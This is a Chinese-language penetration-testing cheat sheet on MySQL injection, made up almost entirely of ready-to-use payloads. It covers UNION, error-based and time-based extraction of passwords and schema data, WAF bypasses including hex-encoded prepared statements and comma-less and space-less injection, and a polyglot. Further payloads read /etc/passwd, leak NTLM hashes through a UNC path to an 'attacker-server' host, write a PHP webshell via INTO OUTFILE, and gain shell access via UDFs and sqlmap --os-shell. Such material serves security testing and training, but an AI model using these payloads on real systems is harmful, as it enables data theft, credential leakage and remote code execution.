---
attack_surface: [注入类]
impact: [远程代码执行, 信息泄露, 权限提升]
risk_level: 严重
prerequisites:
  - SQL 注入基础
  - MySQL 语法与函数
difficulty: 中级
related_techniques:
  - mssql-injection
  - oracle-injection
  - postgresql-injection
  - sql-injection
tools:
  - sqlmap
  - Burp Suite
---

# MySQL Injection — 专项技术与绕过

> 关联文档：[SQL Injection 总览](../README.md) · [MSSQL Injection](../MSSQL%20Injection.md) · [Oracle Injection](../Oracle%20Injection.md) · [PostgreSQL Injection](../PostgreSQL%20Injection.md) · [sqlmap 使用指南](../sqlmap%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97.md)

---

# 0x01 注释与版本识别

```sql
-- MySQL 注释
# MySQL 注释 (URL 编码 %23)
/* MySQL 注释 */
/*!32302 10*/     -- 版本条件注释 (仅 MySQL >= 3.23.02 执行)

-- 版本函数
SELECT @@version;
SELECT version();
SELECT @@innodb_version;

-- 数据库信息
SELECT database();
SELECT user();
SELECT system_user();
SELECT @@datadir;
SELECT @@hostname;
SELECT connection_id();
```

---

# 0x02 实用函数

```sql
-- 字符串操作
SELECT hex(database());
SELECT conv(hex(database()),16,10);      -- 十六进制 → 十进制
SELECT replace(database(),"r","R");
SELECT substr(database(),1,1)='r';
SELECT substring(database(),1,1)=0x72;
SELECT ascii(substring(database(),1,1))=114;
SELECT database()=char(114,101,120,116,101,115,116,101,114);
SELECT group_concat(<COLUMN>) FROM <TABLE>;

-- 条件控制
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null));
SELECT group_concat(CASE(table_schema) WHEN(database()) THEN(table_name) END);

-- 盲注辅助
SELECT mid(version(),X,1)='5';
SELECT LPAD(version(),1,LENGTH(version()),'1')='asd';
SELECT INSTR('foobarbar', 'fo...')=1;
SELECT substring(database(),1,1)=0x72;
```

---

# 0x03 UNION-Based 注入

```sql
-- 列数探测
ORDER BY 1, ORDER BY 2, ORDER BY 3, ...
UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3, ...

-- Schema 提取
UniOn Select 1,2,3,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata

-- 表名提取 (可用 mysql.innodb_table_stats 绕过 WAF)
UniOn Select 1,2,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
-- Modern WAF 绕过替代:
SELECT table_name FROM mysql.innodb_table_stats;
SELECT table_name FROM sys.x$schema_flattened_keys;
SELECT table_name FROM sys.schema_table_statistics;

-- 列名 + 数据提取
UniOn Select 1,2,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+<table>
```

---

# 0x04 Error-Based 注入

```sql
-- ExtractValue (最常用)
AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1), 0x7e))

-- UpdateXML
AND updatexml(null, concat(0x7e, IFNULL((SELECT name FROM project_state LIMIT 1 OFFSET 0), 'NULL'), 0x7e, '///'), null)

-- FLOOR/RAND 双查询
AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)
```

---

# 0x05 WAF 绕过

## 5.1 使用 Prepared Statements 绕过关键字过滤

```sql
-- 将查询语句十六进制编码赋值给变量 → PREPARE → EXECUTE
0); SET @query = 0x53454c45435420534c454550283129; PREPARE stmt FROM @query; EXECUTE stmt; #
-- 0x53454c45435420534c454550283129 = "SELECT SLEEP(1)"
```

## 5.2 无逗号注入

```sql
-- UNION SELECT 两列无逗号
-1' UNION SELECT * FROM (SELECT 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 ON 1=1#

-- SUBSTRING 无逗号: FROM n FOR 1 替代 SUBSTRING(str, n, 1)
SELECT SUBSTRING(password FROM 1 FOR 1) FROM users;

-- LIMIT 无逗号: LIMIT 1 OFFSET 0 替代 LIMIT 0,1
```

## 5.3 无空格注入 (`/**/` 注释技巧)

```sql
-- MySQL 将 /**/ 同时视为注释和空白符
# 绕过 sscanf("%128s", buf) 之类在第一个空格处截断的过滤器
'/**/OR/**/SLEEP(5)--/**/-'

-- 完整时间盲注绕过:
GET /api/device/status HTTP/1.1
Authorization: Bearer AAAAAA'/**/OR/**/SLEEP(5)--/**/-'
```

## 5.4 无列名提取

```sql
-- 已知表名但不知列名时:
-- 列数探测
SELECT (SELECT "", "") = (SELECT * FROM demo LIMIT 1);     -- 2 列
SELECT (SELECT "", "", "") < (SELECT * FROM demo LIMIT 1); -- 3 列

-- 值盲注 (假设 2 列: ID + flag)
SELECT (SELECT 1, 'flaf') = (SELECT * FROM demo LIMIT 1);  -- TRUE → 前缀匹配
```

---

# 0x06 全模式注入 Polyglot

```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/"
```

---

# 0x07 Full-Text Search (FTS) BOOLEAN MODE 操作符滥用

当开发人员将用户输入直接传给 `MATCH(col) AGAINST('...' IN BOOLEAN MODE)` 时，MySQL 在引号内部解析布尔搜索操作符：

```sql
-- 后端构造:
SELECT tid, firstpost FROM threads WHERE MATCH(subject) AGAINST('+jack*' IN BOOLEAN MODE);

-- BOOLEAN MODE 操作符:
-- + : 必须包含
-- - : 必须不包含
-- * : 尾部通配符 (前缀匹配)
-- " : 精确短语
-- () : 分组
-- < > ~ : 权重调整
```

**利用思路**：无需突破引号 — 在引号内部使用操作符做前缀枚举：

```
keywords=%26%26%26%26%26+%2B{FUZZ}*xD
# %26 = &, %2B = +
# 尾部 xD 被 trim → {FUZZ}* 保留 → 前缀盲注 oracle
```

枚举流程：`+a*` → 匹配? → `+aa*` → `+ab*` → ... → 完整字符串还原。

---

# 0x08 MySQL SSRF / RCE (File Privilege)

## 8.1 LOAD_FILE — 文件读取与 SSRF

```sql
-- secure_file_priv="" 时可用
SELECT LOAD_FILE('/etc/passwd');

-- Windows UNC 路径 → SMB 认证 → NTLM hash 泄露
SELECT LOAD_FILE('\\\\attacker-server\\share\\file.txt');
-- 仅限 TCP 445，无法修改端口
```

## 8.2 INTO OUTFILE — WebShell 写入

```sql
SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

## 8.3 UDF (User Defined Function) → RCE

```sql
-- 条件: @@plugin_dir 可写、file_priv='Y'、secure_file_priv=""
-- 检查文件权限用户
SELECT user FROM mysql.user WHERE file_priv='Y';

-- 使用 lib_mysqludf_sys 或自定义 UDF 库
-- 库文件可通过 hex 编码写入 plugin_dir

-- sqlmap 自动化:
sqlmap -u "URL" --os-shell
```

---

# 0x09 时间盲注

```sql
-- SLEEP()
AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)

-- BENCHMARK — 比 SLEEP 更隐蔽 (不调用 sleep syscall)
AND IF(SUBSTRING(password,1,1)='a', BENCHMARK(5000000,MD5('x')), 0)

-- 复合时间盲注
AND IF(MID(VERSION(),1,1)='5',SLEEP(5),0)
```

---

# 0x0A 其他特性

```sql
-- 查看 MySQL 历史查询
SELECT * FROM sys.x$statement_analysis;

-- 查看用户权限
SELECT * FROM mysql.user WHERE file_priv='Y';
```

---

# 0x0B 参考资料

- [PayloadsAllTheThings — MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
- [Pre-auth SQLi to RCE in FortiWeb (CVE-2025-25257)](https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/)
- [MySQL Full-Text Search Documentation](https://dev.mysql.com/doc/refman/8.4/en/fulltext-boolean.html)
- [FTS BOOLEAN MODE ReDisclosure (myBB case study)](https://exploit.az/posts/wor/)
- [LookOut: RCE on Google Looker via FTS](https://www.tenable.com/blog/google-looker-vulnerabilities-rce-internal-access-lookout)
- [SSRF/XSPA via SQL Injection](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)
